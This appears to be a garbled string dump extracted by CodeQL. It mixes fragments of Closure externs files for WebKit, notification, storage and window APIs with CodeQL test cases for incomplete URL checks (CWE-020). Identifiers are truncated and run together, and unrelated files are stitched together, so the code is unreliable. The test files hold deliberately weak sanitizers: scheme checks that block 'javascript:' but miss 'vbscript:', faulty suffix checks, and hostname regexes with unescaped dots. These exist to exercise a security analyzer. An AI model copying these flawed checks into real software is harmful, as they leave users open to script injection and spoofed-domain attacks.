kInsidewebkitC ... ressionwebkitC ... leColorwebkitC ... leStylewebkitC ... leWidthwebkitD ... dRegionwebkitH ... aracterwebkitH ... itAfterwebkitH ... tBeforewebkitH ... itLineswebkitM ... ollapsewebkitM ... rectionwebkitM ... crementwebkitM ... etitionwebkitM ... eOutsetwebkitM ... eRepeatwebkitM ... geSlicewebkitM ... eSourcewebkitM ... geWidthwebkitM ... teColorwebkitM ... lHeightwebkitM ... alWidthwebkitO ... rollingwebkitP ... eOriginwebkitP ... OriginXwebkitP ... OriginYwebkitP ... rAdjustwebkitR ... akAfterwebkitR ... kBeforewebkitR ... kInsidewebkitT ... htColorwebkitT ... ionLinewebkitT ... nEffectwebkitT ... onStylewebkitT ... isColorwebkitT ... ositionwebkitT ... isStylewebkitT ... ntationwebkitT ... keColorwebkitT ... keWidthwebkitT ... mOriginwebkitT ... OriginXwebkitT ... OriginYwebkitT ... OriginZwebkitT ... onDelaywebkitT ... urationwebkitT ... ropertywebkitT ... atCountwebkitT ... unctionWebKitP ... type.x;WebKitP ... otype.xWebKitP ... ototypeWebKitP ... type.y;WebKitP ... otype.y/mnt/disk1/t-namanjain/CodeQL/codeql/javascript/tools/data/externs/web/webkit_dom.js
 * @fileoverview Definitions for all the extensions over W3C's DOM
 *  specification by WebKit. This file depends on w3c_dom2.js.
 *  All the provided definitions has been type annotated
 *
 * @externs
 
 * @param {boolean=} opt_center
 * @see https://bugzilla.mozilla.org/show_bug.cgi?id=403510
 * @return {undefined}
 
 * @constructor
 * @see http://trac.webkit.org/browser/trunk/Source/WebCore/page/MemoryInfo.idl
 * @see http://trac.webkit.org/browser/trunk/Source/WebCore/page/MemoryInfo.cpp
 /**\n *  ... cpp\n */
 * @constructor
 * @see http://trac.webkit.org/browser/trunk/Source/WebCore/inspector/ScriptProfileNode.idl
  @type {Array<ScriptProfileNode>} 
 * @constructor
 * @see http://trac.webkit.org/browser/trunk/Source/WebCore/inspector/ScriptProfile.idl
  @type {ScriptProfileNode} 
 * @constructor
 * @see http://trac.webkit.org/browser/trunk/Source/WebCore/page/Console.idl
 * @see http://trac.webkit.org/browser/trunk/Source/WebCore/page/Console.cpp
 
 * @param {*} condition
 * @param {...*} var_args
 * @return {undefined}
 
 * @param {...*} var_args
 * @return {undefined}
 
 * @param {*} value
 * @return {undefined}
 
 * @param {!Object} data
 * @param {*=} opt_columns
 * @return {undefined}
 
 * @param {string=} opt_title
 * @return {undefined}
  @type {Array<ScriptProfile>} /** @ty ... le>} */ @type {MemoryInfo} /** @ty ... nfo} */
 * @type {!Console}
 * @suppress {duplicate}
 
 * @type {number}
 * @see http://developer.android.com/reference/android/webkit/WebView.html
 
 * @param {Node} baseNode
 * @param {number} baseOffset
 * @param {Node} extentNode
 * @param {number} extentOffset
 * @return {undefined}
 
 * @param {string} alter
 * @param {string} direction
 * @param {string} granularity
 * @return {undefined}
 
 * @param {Element} element
 * @param {string} pseudoElement
 * @param {boolean=} opt_authorOnly
 * @return {CSSRuleList}
 * @nosideeffects
 
 * @param {string} contextId
 * @param {string} name
 * @param {number} width
 * @param {number} height
 * @nosideeffects
 * @return {undefined}
 
 * @param {number} x
 * @param {number} y
 * @return {?Range}
 * @nosideeffects
 * @see https://developer.mozilla.org/en-US/docs/Web/API/Document/caretRangeFromPoint
 scrollIntoViewIfNeededopt_centerMemoryInfoScriptProfileNodefunctionNametotalTimeselfTimenumberOfCallsvisiblecallUIDScriptProfileprofilesdevicePixelRatiobaseNodebaseOffsetextentNodeextentOffsetsetBaseAndExtentmodifyaltergranularitygetMatchedCSSRulespseudoElementopt_authorOnlygetCSSCanvasContextcaretRangeFromPointDefinitions for all the extensions over W3C's DOM
specification by WebKit. This file depends on w3c_dom2.js.
All the provided definitions has been type annotated
*https://bugzilla.mozilla.org/show_bug.cgi?id=403510
http://trac.webkit.org/browser/trunk/Source/WebCore/page/MemoryInfo.idl
http://trac.webkit.org/browser/trunk/Source/WebCore/page/MemoryInfo.cpphttp://trac.webkit.org/browser/trunk/Source/WebCore/inspector/ScriptProfileNode.idlArray.<ScriptProfileNode>http://trac.webkit.org/browser/trunk/Source/WebCore/inspector/ScriptProfile.idlhttp://trac.webkit.org/browser/trunk/Source/WebCore/page/Console.idl
http://trac.webkit.org/browser/trunk/Source/WebCore/page/Console.cppArray.<ScriptProfile>http://developer.android.com/reference/android/webkit/WebView.html?Rangehttps://developer.mozilla.org/en-US/docs/Web/API/Document/caretRangeFromPointElement ... er) {};Element ... ter) {}Element ... fNeededscrollI ... fNeededMemoryI ... apSize;MemoryI ... eapSizeMemoryInfo.prototypeMemoryI ... eLimit;MemoryI ... zeLimitScriptP ... onName;ScriptP ... ionNameScriptP ... ototypeScriptP ... pe.url;ScriptP ... ype.urlScriptP ... Number;ScriptP ... eNumberScriptP ... alTime;ScriptP ... talTimeScriptP ... lfTime;ScriptP ... elfTimeScriptP ... fCalls;ScriptP ... OfCallsScriptP ... ildren;ScriptP ... hildrenScriptP ... isible;ScriptP ... visibleScriptP ... allUID;ScriptP ... callUIDScriptP ... .title;ScriptP ... e.titleScriptP ... pe.uid;ScriptP ... ype.uidScriptP ... e.head;ScriptP ... pe.headConsole ... ofiles;Console ... rofilesConsole ... memory;Console ... .memoryWindow. ... onsole;Window. ... consolevar console;Window. ... lRatio;Window. ... elRatioSelecti ... seNode;Selecti ... aseNodeSelecti ... eOffsetSelecti ... ntNode;Selecti ... entNodeSelecti ... tOffsetSelecti ... e.type;Selecti ... pe.typeSelecti ... e.emptySelecti ... dExtentSelecti ... ty) {};Selecti ... ity) {}Selecti ... .modifyViewCSS ... ly) {};ViewCSS ... nly) {}ViewCSS ... SSRulesDocumen ... ht) {};Documen ... ght) {}Documen ... Context/mnt/disk1/t-namanjain/CodeQL/codeql/javascript/tools/data/externs/web/webkit_event.js
 * @fileoverview Definitions for all the extensions over W3C's
 *  event specification by WebKit. This file depends on w3c_event.js.
 *  All the provided definitions have been type annotated
 *
 * @externs
 
 * @constructor
 * @extends {Event}
 * @see http://developer.apple.com/library/safari/documentation/AudioVideo/Reference/WebKitAnimationEventClassReference/WebKitAnimationEvent/WebKitAnimationEvent.html
 wheelDeltaXwheelDeltaYWebKitAnimationEventanimationNameelapsedTimeDefinitions for all the extensions over W3C's
event specification by WebKit. This file depends on w3c_event.js.
All the provided definitions have been type annotated
*http://developer.apple.com/library/safari/documentation/AudioVideo/Reference/WebKitAnimationEventClassReference/WebKitAnimationEvent/WebKitAnimationEvent.htmlEvent.p ... DeltaX;Event.p ... lDeltaXEvent.p ... DeltaY;Event.p ... lDeltaYWebKitA ... onName;WebKitA ... ionNameWebKitA ... ototypeWebKitA ... edTime;WebKitA ... sedTime/mnt/disk1/t-namanjain/CodeQL/codeql/javascript/tools/data/externs/web/webkit_notifications.js
 * @fileoverview Definitions for W3C's Notifications specification.
 * @externs
 
 * @typedef {{dir: (string|undefined), lang: (string|undefined),
 *            body: (string|undefined), tag: (string|undefined),
 *            icon: (string|undefined),
 *            requireInteraction: (boolean|undefined),
 *            actions: (!Array<!NotificationAction>|undefined)}}
 * @see http://notifications.spec.whatwg.org/#notificationoptions
 
 * @typedef {{action: string, title: string, icon: (string|undefined)}}
 * @see https://notifications.spec.whatwg.org/#dictdef-notificationoptions
 
 * @typedef {{tag: (string|undefined)}}
 * @see https://notifications.spec.whatwg.org/#dictdef-getnotificationoptions
  @interface /** @interface */
 * @param {string} title
 * @param {NotificationOptions=} opt_options
 * @constructor
 * @implements {EventTarget}
 * @see http://notifications.spec.whatwg.org/#notification
 
 * @param {NotificationPermissionCallback=} opt_callback
 * @return {!Promise<string>}
 
 * The string used by clients to identify the notification.
 * @type {string}
 
 * The ID used by clients to uniquely identify notifications to eliminate
 * duplicate notifications.
 * @type {string}
 * @deprecated Use NotificationOptions.tag instead.
 
 * The string used by clients to specify the directionality (rtl/ltr) of the
 * notification.
 * @type {string}
 * @deprecated Use NotificationOptions.titleDir and bodyDir instead.
 
 * Displays the notification.
 * @return {undefined}
 
 * Prevents the notification from being displayed, or closes it if it is already
 * displayed.
 * @return {undefined}
 
 * An event handler called when notification is closed.
 * @type {?function(Event)}
 
 * An event handler called if the notification could not be displayed due to
 * an error (i.e. resource could not be loaded).
 * @type {?function(Event)}
 
 * An event handler called when the notification has become visible.
 * @type {?function(Event)}
 * @deprecated Use onshow instead.
 
 * An event handler called when the notification has become visible.
 * @type {?function(Event)}
 
 * An event handler called when the notification has been clicked on.
 * @type {?function(Event)}
 
 * @typedef {function(string)}
 * @see http://notifications.spec.whatwg.org/#notificationpermissioncallback
 
 * @constructor
 * @see http://dev.w3.org/2006/webapi/WebNotifications/publish/#dialog-if
 * @deprecated Use Notification instead.
 
 * Creates a text+icon notification and displays it to the user.
 * @param {string} iconUrl
 * @param {string} title
 * @param {string} body
 * @return {Notification}
 
 * Creates an HTML notification and displays it to the user.
 * @param {string} url
 * @return {Notification}
 
 * Checks if the user has permission to display notifications.
 * @return {number}
 
 * Requests permission from the user to display notifications.
 * @param {Function=} opt_callback
 * @return {void}
 
 * WebKit browsers expose the NotificationCenter API through
 * window.webkitNotifications.
 * @type {NotificationCenter}
 
 * @see https://notifications.spec.whatwg.org/#notificationevent
 * @constructor
 * @param {string} type
 * @param {!ExtendableEventInit=} opt_eventInitDict
 * @extends {ExtendableEvent}
  @type {?Notification} NotificationActionNotificationOptionsInterface_requireInteractionrequestPermissionreplaceIdondisplayonshowNotificationPermissionCallbackNotificationCentercreateNotificationiconUrlcreateHTMLNotificationcheckPermissionwebkitNotificationsNotificationEventnotificationDefinitions for W3C's Notifications specification.
{dir: (string|undefined), lang: (string|undefined), body: (string|undefined), tag: (string|undefined), icon: (string|undefined), requireInteraction: (boolean|undefined), actions: (!Array.<!NotificationAction>|undefined)}actions(!Array.<!NotificationAction>|undefined)!Array.<!NotificationAction>Array.<!NotificationAction>!NotificationActionhttp://notifications.spec.whatwg.org/#notificationoptions{action: string, title: string, icon: (string|undefined)}https://notifications.spec.whatwg.org/#dictdef-notificationoptions{tag: (string|undefined)}https://notifications.spec.whatwg.org/#dictdef-getnotificationoptionshttp://notifications.spec.whatwg.org/#notificationNotificationPermissionCallback=The string used by clients to identify the notification.The ID used by clients to uniquely identify notifications to eliminate
duplicate notifications.Use NotificationOptions.tag instead.The string used by clients to specify the directionality (rtl/ltr) of the
notification.Use NotificationOptions.titleDir and bodyDir instead.Displays the notification.Prevents the notification from being displayed, or closes it if it is already
displayed.An event handler called when notification is closed.An event handler called if the notification could not be displayed due to
an error (i.e. resource could not be loaded).An event handler called when the notification has become visible.Use onshow instead.An event handler called when the notification has been clicked on.http://notifications.spec.whatwg.org/#notificationpermissioncallbackhttp://dev.w3.org/2006/webapi/WebNotifications/publish/#dialog-if
Use Notification instead.Creates a text+icon notification and displays it to the user.Creates an HTML notification and displays it to the user.Checks if the user has permission to display notifications.Requests permission from the user to display notifications.WebKit browsers expose the NotificationCenter API through
window.webkitNotifications.https://notifications.spec.whatwg.org/#notificationevent
var Not ... ptions;var Not ... Action;GetNoti ... Optionsvar Not ... on() {}Notific ... on() {}Notific ... erface_Notific ... pe.dir;Notific ... ype.dirNotific ... ototypeNotific ... e.lang;Notific ... pe.langNotific ... e.body;Notific ... pe.bodyNotific ... pe.tag;Notific ... ype.tagNotific ... e.icon;Notific ... pe.iconNotific ... action;Notific ... ractionNotific ... ission;Notific ... missionNotific ... ck) {};Notific ... ack) {}Notific ... re) {};Notific ... ure) {}Notific ... istenerNotific ... vt) {};Notific ... evt) {}Notific ... chEventNotific ... .title;Notific ... e.titleNotific ... laceId;Notific ... placeIdNotific ... n() {};Notific ... pe.showNotific ... .cancelNotific ... e.closeNotific ... nclose;Notific ... oncloseNotific ... nerror;Notific ... onerrorNotific ... isplay;Notific ... displayNotific ... onshow;Notific ... .onshowNotific ... nclick;Notific ... onclickvar Not ... llback;Notific ... allbackNotific ... dy) {};Notific ... ody) {}Notific ... icationfunctio ... ody) {}Notific ... rl) {};Notific ... url) {}createH ... icationWindow. ... ations;Window. ... cationsNotific ... cation;/mnt/disk1/t-namanjain/CodeQL/codeql/javascript/tools/data/externs/web/webkit_usercontent.js
 * @fileoverview Definitions for WKWebView's User Content interface.
 *   https://developer.apple.com/library/prerelease/ios/documentation/WebKit/Reference/WKUserContentController_Ref/
 *   https://trac.webkit.org/browser/trunk/Source/WebCore/page/WebKitNamespace.h
 *
 * @externs
 
 * @type {!UserMessageHandlersNamespace}
 
 * @constructor
 * @implements {IObject<string, UserMessageHandler>}
 
 * @param {*} message
 * @return {undefined}
 
 * @type {!WebKitNamespace}
 * @const
 WebKitNamespacemessageHandlersUserMessageHandlersNamespaceUserMessageHandlerwebkitDefinitions for WKWebView's User Content interface.
https://developer.apple.com/library/prerelease/ios/documentation/WebKit/Reference/WKUserContentController_Ref/
https://trac.webkit.org/browser/trunk/Source/WebCore/page/WebKitNamespace.h
*!UserMessageHandlersNamespaceIObject.<string, UserMessageHandler>!WebKitNamespaceWebKitN ... ndlers;WebKitN ... andlersWebKitN ... ototypeUserMes ... mespaceUserMes ... ge) {};UserMes ... age) {}UserMes ... MessageUserMes ... ototypevar webkit;/mnt/disk1/t-namanjain/CodeQL/codeql/javascript/tools/data/externs/web/webstorage.js
 * @fileoverview Definitions for W3C's WebStorage specification.
 * This file depends on html5.js.
 * @externs
 
 * @interface
 * @see http://www.w3.org/TR/2011/CR-webstorage-20111208/#the-storage-interface
 
 * @param {number} index
 * @return {?string}
 
 * @param {string} key
 * @return {?string}
 
 * @param {string} key
 * @param {string} data
 * @return {void}
 
 * @param {string} key
 * @return {void}
 
 * @interface
 * @see http://www.w3.org/TR/2011/CR-webstorage-20111208/#the-sessionstorage-attribute
 
 * @type {Storage}
 
 * Window implements WindowSessionStorage
 *
 * @type {Storage}
 
 * @interface
 * @see http://www.w3.org/TR/2011/CR-webstorage-20111208/#the-localstorage-attribute
 
 * Window implements WindowLocalStorage
 *
 * @type {Storage}
 
 * This is the storage event interface.
 * @see http://www.w3.org/TR/2011/CR-webstorage-20111208/#the-storage-event
 * @extends {Event}
 * @constructor
 
 * @type {?Storage}
 
 * @param {string} typeArg
 * @param {boolean} canBubbleArg
 * @param {boolean} cancelableArg
 * @param {string} keyArg
 * @param {?string} oldValueArg
 * @param {?string} newValueArg
 * @param {string} urlArg
 * @param {?Storage} storageAreaArg
 * @return {void}
 StoragegetItemsetItemremoveItemWindowSessionStorageWindowLocalStoragelocalStorageStorageEventstorageAreainitStorageEventkeyArgoldValueArgurlArgstorageAreaArgDefinitions for W3C's WebStorage specification.
This file depends on html5.js.
http://www.w3.org/TR/2011/CR-webstorage-20111208/#the-storage-interfacehttp://www.w3.org/TR/2011/CR-webstorage-20111208/#the-sessionstorage-attributeWindow implements WindowSessionStoragehttp://www.w3.org/TR/2011/CR-webstorage-20111208/#the-localstorage-attributeWindow implements WindowLocalStorageThis is the storage event interface.http://www.w3.org/TR/2011/CR-webstorage-20111208/#the-storage-event
?StorageStorage ... length;Storage ... .lengthStorage.prototypeStorage ... ex) {};Storage ... dex) {}Storage ... ype.keyStorage ... ey) {};Storage ... key) {}Storage ... getItemStorage ... ta) {};Storage ... ata) {}Storage ... setItemStorage ... oveItemStorage ... n() {};Storage ... on() {}Storage ... e.clearWindowS ... torage;WindowS ... StorageWindowS ... ototypeWindowL ... torage;WindowL ... StorageWindowL ... ototypeStorage ... pe.key;Storage ... dValue;Storage ... ldValueStorage ... wValue;Storage ... ewValueStorage ... pe.url;Storage ... ype.urlStorage ... geArea;Storage ... ageAreaStorage ... rg) {};Storage ... Arg) {}Storage ... geEvent/mnt/disk1/t-namanjain/CodeQL/codeql/javascript/tools/data/externs/web/whatwg_encoding.js
 * @fileoverview Definitions for WHATWG's Encoding specification
 *     https://encoding.spec.whatwg.org
 * @externs
 
 * @param {!BufferSource=} input
 * @param {?Object=} options
 * @return {!string}
 * @see https://encoding.spec.whatwg.org/#textdecoder
 
 * @constructor
 * @param {string=} utfLabel
 /**\n *  ... bel\n */
 * @param {string=} input
 * @return {!Uint8Array}
 utfLabelDefinitions for WHATWG's Encoding specification
https://encoding.spec.whatwg.org
!BufferSource=?Object=https://encoding.spec.whatwg.org/#textdecoder/mnt/disk1/t-namanjain/CodeQL/codeql/javascript/tools/data/externs/web/window.js
 * @fileoverview JavaScript Built-Ins for windows properties.
 *
 * @externs
 * @author stevey@google.com (Steve Yegge)
  Window properties// Window properties Only common properties are here.  Others such as open()// Only ...  open() should be used with an explicit Window object.// shou ... object.
 * @type {!Window}
 * @see https://developer.mozilla.org/en/DOM/window.top
 * @const
 
 * @type {!Navigator}
 * @see https://developer.mozilla.org/en/DOM/window.navigator
 * @const
 
 * @type {!HTMLDocument}
 * @see https://developer.mozilla.org/en/DOM/window.document
 * @const
 
 * @type {!Location}
 * @see https://developer.mozilla.org/en/DOM/window.location
 * @const
 * @suppress {duplicate}
 * @implicitCast
 
 * @type {!Screen}
 * @see https://developer.mozilla.org/En/DOM/window.screen
 * @const
 
 * @type {!Window}
 * @see https://developer.mozilla.org/En/DOM/Window.self
 * @const
  Magic functions for Firefox's LiveConnect.// Magi ... onnect. We'll probably never use these in practice. But redefining them// We'l ... ng them will fire up the JVM, so we want to reserve the symbol names.// will ...  names.
 * @see https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/JavaArray
 
 * @see https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/JavaClass
  We just ripped this from the FF source; it doesn't appear to be// We j ... r to be publicly documented.// publ ... mented.
 * @see https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/JavaObject
 
 * @see https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/JavaPackage
 
 * @see https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Packages
 
 * @see https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/java
 /**\n *  ... ava\n */
 * @see https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/netscape
 /**\n *  ... ape\n */
 * @see https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/sun
 /**\n *  ... sun\n */
 * @param {number|undefined|null} immediateID
 * @see https://developer.mozilla.org/en-US/docs/DOM/window.clearImmediate
 * @see http://msdn.microsoft.com/en-us/library/ie/hh924825(v=vs.85).aspx
 * @return {undefined}
 
 * @param {number|undefined?} intervalID
 * @see https://developer.mozilla.org/en/DOM/window.clearInterval
 * @suppress {duplicate}
 * @return {undefined}
 
 * @param {number|undefined?} timeoutID
 * @see https://developer.mozilla.org/en/DOM/window.clearTimeout
 * @suppress {duplicate}
 * @return {undefined}
 
 * @param {*} message
 * @return {boolean}
 * @see https://developer.mozilla.org/en/DOM/window.confirm
 /**\n *  ... irm\n */
 * @see https://developer.mozilla.org/en/DOM/window.dump
 * @param {*} x
 * @return {undefined}
 
 * @param {string} message
 * @param {string=} opt_value
 * @return {?string}
 * @see https://developer.mozilla.org/en/DOM/window.prompt
 /**\n *  ... mpt\n */
 * @param {function()} callback
 * @return {number}
 * @see https://developer.mozilla.org/en-US/docs/DOM/window.setImmediate
 * @see http://msdn.microsoft.com/en-us/library/ie/hh773176(v=vs.85).aspx
 
 * @param {Function|string} callback
 * @param {number=} opt_delay
 * @return {number}
 * @see https://developer.mozilla.org/en/DOM/window.setInterval
 * @see https://html.spec.whatwg.org/multipage/webappapis.html#timers
 
 * @param {Function|string} callback
 * @param {number=} opt_delay
 * @param {...*} var_args
 * @return {number}
 * @see https://developer.mozilla.org/en/DOM/window.setTimeout
 * @see https://html.spec.whatwg.org/multipage/webappapis.html#timers
 screenJavaArrayJavaClassJavaMemberJavaObjectJavaPackagePackagesjavanetscapesunimmediateIDintervalIDtimeoutIDconfirmdumpopt_delayJavaScript Built-Ins for windows properties.
*https://developer.mozilla.org/en/DOM/window.top
!Navigatorhttps://developer.mozilla.org/en/DOM/window.navigator
https://developer.mozilla.org/en/DOM/window.document
https://developer.mozilla.org/en/DOM/window.location
!Screenhttps://developer.mozilla.org/En/DOM/window.screen
https://developer.mozilla.org/En/DOM/Window.self
https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/JavaArrayhttps://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/JavaClasshttps://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/JavaObjecthttps://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/JavaPackagehttps://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Packageshttps://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/javahttps://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/netscapehttps://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/sun(number|undefined|null)https://developer.mozilla.org/en-US/docs/DOM/window.clearImmediate
http://msdn.microsoft.com/en-us/library/ie/hh924825(v=vs.85).aspx
(number|undefined?)undefined?https://developer.mozilla.org/en/DOM/window.clearInterval
https://developer.mozilla.org/en/DOM/window.clearTimeout
https://developer.mozilla.org/en/DOM/window.confirmhttps://developer.mozilla.org/en/DOM/window.dump
https://developer.mozilla.org/en/DOM/window.prompthttps://developer.mozilla.org/en-US/docs/DOM/window.setImmediate
http://msdn.microsoft.com/en-us/library/ie/hh773176(v=vs.85).aspx(Function|string)https://developer.mozilla.org/en/DOM/window.setInterval
https://html.spec.whatwg.org/multipage/webappapis.html#timershttps://developer.mozilla.org/en/DOM/window.setTimeout
var top;var navigator;var document;var location;var screen;var self;var JavaArray;var JavaClass;var JavaMember;var JavaObject;var JavaPackage;var Packages;var java;var netscape;var sun;functio ... eID) {}functio ... lID) {}functio ... tID) {}function dump(x) {}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-020/IncompleteUrlSchemeCheck.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-020/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/mnt/disk1/t-namanjain/CodeQL/codeql-repo NOT OK// NOT OK OK// OK	asdummy'dummy'sanitizeUrlletuif"javascript:""about:blank"badProtocols'javascript:''data:'badProtocolNoColon'javascript''data'badProtocolsGood'vbscript:'test2newtest3googutilsgetSchemetest4':'test5==="javascript"test6test7/:/test8"javascript|data""|"!==-test9"data"test10/^(javascript|data)$/test11test12!test13switchcasetest14import  ... dummy';* as dummyfunctio ...  url;\n}{\n    l ...  url;\n}let u = ... Case();u = dec ... rCase()decodeU ... rCase()decodeU ... werCasedecodeU ... .trim()decodeURI(url).trimdecodeURI(url)if (u.s ... blank";u.start ... ript:")u.startsWithjavascript:return  ... blank";about:blankreturn url;let bad ... ata:'];badProt ... data:']['javas ... data:']data:let bad ... data'];badProt ... 'data']['javas ... 'data']let bad ... ipt:'];badProt ... ript:']['javas ... ript:']vbscript:let pro ... otocol;protoco ... rotocolnew URL ... rotocolnew URL(url)if (bad ... blank";badProt ... otocol)badProt ... ncludeslet sch ... e(url);scheme  ... me(url)goog.ur ... me(url)goog.ur ... tSchemegoog.uri.utilsgoog.uribadProt ... scheme)let sch ... :')[0];scheme  ... ':')[0]url.split(':')[0]url.split(':')url.splitif (sch ... blank";scheme  ... script"let sch ... :/)[0];scheme  ... /:/)[0]url.split(/:/)[0]url.split(/:/)if ("ja ... blank";"javasc ...  !== -1"javasc ... scheme)"javasc ... indexOf"javasc ... it("|")"javasc ... ".splitjavascript|data|-1"javasc ...  scheme"data" === schemeif (/^( ... blank";/^(java ... == null/^(java ... scheme)/^(java ... $/.exec/^(java ... data)$/^(javascript|data)$^(javascript|data)functio ... ank";\n}{\n    l ... ank";\n}if (/^( ... rn url;if (!/^ ... rn url;!/^(jav ... scheme)functio ... l;\n\t}\n}{\n\tlet  ... l;\n\t}\n}switch  ... url;\n\t}case "javascript":case "d ... blank";default ... rn url;/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-020/IncompleteUrlSchemeCheckGood.js"data:""vbscript:"u.start ... data:")/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-020/examples/IncorrectSuffixCheck.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-020/examplesfunctio ... ngth;\n}{\n  ret ... ngth;\n}return  ... length;x.lastI ... .lengthx.lastIndexOf(y)x.lastIndexOfx.length - y.lengthx.lengthy.length/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-020/examples/IncorrectSuffixCheckGood.js&&{\n  let ... ngth;\n}let ind ... xOf(y);index = ... exOf(y)index ! ... .lengthindex !== -1index = ... .length/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-020/tst-IncompleteHostnameRegExp.js NOT OK, but not detected// NOT  ... etected NOT OK, but flagged by js/useless-regexp-character-escape// NOT  ... -escape OK, wildcards are intentional// OK,  ... ntional OK, the wildcard is intentional kinda OK - one disjunction doesn't even look like a hostname// kind ... ostname/^http:\/\/example.com//^http:\/\/test.example.com//^http:\/\/test\\.example.com//^http:\/\/test.example.net//^http:\/\/test.(example-a|example-b).com//^http:\/\/(.+).example.com\///^http:\/\/(\\.+)\\.example.com//^http:\/\/(?:.+)\\.test\\.example.com\///^http:\/\/test.example.com\/(?:.*)/"^http://test.example.com"`test.example.com$'^test.example.com'${'test.example.com$'convert1domainsconvert2=>/^(.+\.(?:example-a|example-b)\.com)\///^(https?:)?\/\/((service|www).)?example.com(?=$|\/)//^(http|https):\/\/www.example.com\/p\/f\///^(http:\/\/sub.example.com\/)/g/^https?:\/\/api.example.com/'^http://localhost:8000|'+'^https?://.+\\.example\\.com/''^http[s]?:\/\/?sub1\\.sub2\\.example\\.com\/f\/(.+)'/^https:\/\/[a-z]*.example.com$/'^protos?://(localhost|.+.example.net|.+.example-a.com|.+.example-b.com|.+.example.internal)'/^(example.dev|example.com)/'^https?://.+.example\\.com/'primary'example.com$''test.''^http://test\.example.com'/^http:\/\/(..|...)\.example\.com\/index\.html//^http:\/\/.\.example\.com\/index\.html//^(foo.example\.com|whatever)$/(functi ... ame\n});(functi ... name\n})functio ... tname\n}{\n\t/^ht ... tname\n}/^http: ... e.com/;/^http: ... le.com/^http:\/\/example.comhttp:\/examplecom^http:\/\/test.example.com^http:\/\/test\\.example.com\\\/^http: ... e.net/;/^http: ... le.net/^http:\/\/test.example.net/^http: ... ).com/;/^http: ... b).com/^http:\/\/test.(example-a|example-b).com(example-a|example-b)example-a|example-bexample-aexample-b/^http: ... com\//;/^http: ... .com\//^http:\/\/(.+).example.com\/(.+).+^http:\/\/(\\.+)\\.example.com(\\.+)\\.+^http:\/\/(?:.+)\\.test\\.example.com\/(?:.+)/^http: ... ?:.*)/;/^http: ... (?:.*)/^http:\/\/test.example.com\/(?:.*)(?:.*).*new Reg ... .com");new Reg ... e.com")"^http: ... le.com"^http://test.example.comhttp://testif (s.m ... m")) {}s.match ... e.com")s.matchfunctio ... rn e; }{ return e; }return e;new Reg ... m"))));new Reg ... om"))))id(id(i ... com")))id(id(" ... .com"))id("^ht ... e.com")new Reg ... com$`);new Reg ... .com$`)`test.example.com$`let hos ... e.com';hostnam ... le.com'^test.example.comnew Reg ... me}$`);new Reg ... ame}$`)`${hostname}$`let dom ... om$' };domain  ... com$' }{ hostn ... com$' }hostnam ... e.com$'new Reg ... tname);new Reg ... stname)domain.hostnamefunctio ... me);\n\t}{\n\t\tret ... me);\n\t}return  ... tname);convert ... m$' });convert ... om$' })let dom ... $' } ];domains ... m$' } ][ { hos ... m$' } ]domains ... t2(d));domains ... rt2(d))domains.mapd => convert2(d)convert2(d)/^(.+\. ... om)\//;/^(.+\. ... com)\//^(.+\.(?:example-a|example-b)\.com)\/(.+\.(?:example-a|example-b)\.com).+\.(?:example-a|example-b)\.com\.(?:example-a|example-b)/^(http ... $|\/)/;/^(http ... =$|\/)/^(https?:)?\/\/((service|www).)?example.com(?=$|\/)(https?:)?(https?:)https?:s?((service|www).)?((service|www).)(service|www).(service|www)service|wwwservicewww(?=$|\/)$|\//^(http ... \/f\//;/^(http ... p\/f\//^(http|https):\/\/www.example.com\/p\/f\/(http|https)http|https/^(http ... m\/)/g;/^(http ... om\/)/g^(http:\/\/sub.example.com\/)(http:\/\/sub.example.com\/)http:\/\/sub.example.com\//^https ... e.com/;/^https ... le.com/^https?:\/\/api.example.comapinew Reg ... com/');new Reg ... .com/')'^http: ... \.com/''^http: ... :8000|'^http://localhost:8000|^http://localhost:8000http://localhost:8000'^https ... \.com/'^https?://.+\.example\.com/://com/new Reg ... (.+)');new Reg ... /(.+)')'^http[ ... \/(.+)'^http[s]?://?sub1\.sub2\.example\.com/f/(.+)[s]?[s]://?sub1sub2com/f//^https ... .com$/;/^https ... e.com$/^https:\/\/[a-z]*.example.com$https:[a-z]*[a-z]a-zRegExp( ... nal)');RegExp( ... rnal)')'^proto ... ernal)'^protos?://(localhost|.+.example.net|.+.example-a.com|.+.example-b.com|.+.example.internal)(localhost|.+.example.net|.+.example-a.com|.+.example-b.com|.+.example.internal)localhost|.+.example.net|.+.example-a.com|.+.example-b.com|.+.example.internallocalhost.+.example.net.+.example-a.com.+.example-b.com.+.example.internal/^(exam ... .com)/;/^(exam 